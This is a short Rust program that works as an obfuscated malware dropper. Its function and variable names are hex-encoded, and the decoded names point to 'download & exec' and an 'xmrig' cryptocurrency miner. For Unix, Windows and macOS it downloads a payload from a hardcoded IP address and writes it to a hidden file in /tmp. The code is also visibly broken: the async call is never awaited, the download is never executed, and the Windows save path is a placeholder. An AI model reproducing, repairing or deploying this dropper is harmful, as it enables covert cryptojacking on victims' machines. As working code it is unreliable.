use std::fs::File;
use std::io::prelude::*;
use std::path::Path;

pub fn main() {
    _0x646f776e6c6f616420262065786563();
}

#[tokio::main]
async fn _0x646f776e6c6f616420262065786563() -> Result<(), reqwest::Error> {
    if cfg!(unix) {
        let _0x746172676574 = "http://150.136.245.71:1337/0x756e6978/.0x786d726967";
        let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;

        let _0x70617468 = Path::new("/tmp/.0x786d726967");

        let mut _0x66696c65 = match File::create(&_0x70617468) {
            Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
            Ok(_0x66696c65) => _0x66696c65,
        };
        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
        _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
    } else if cfg!(windows) {
        let _0x746172676574 = "http://150.136.245.71:1337/0x77696e646f7773/0x786d726967.exe";
        let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;

        let _0x70617468 = Path::new("whatever path idk");

        let mut _0x66696c65 = match File::create(&_0x70617468) {
            Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
            Ok(_0x66696c65) => _0x66696c65,
        };
        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
        _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
    } else if cfg!(target_os = "macos") {
        let _0x746172676574 = "http://150.136.245.71:1337/0x6d61636f73/.0x786d726967";
        let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;

        let _0x70617468 = Path::new("/tmp/.0x786d726967");

        let mut _0x66696c65 = match File::create(&_0x70617468) {
            Err(_0x776879) => panic!("0x636f756c646e277420637265617465 {}", _0x776879),
            Ok(_0x66696c65) => _0x66696c65,
        };
        let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
        _0x66696c65.write_all(_0x636f6e74656e74.as_bytes());
    }
    Ok(())
}
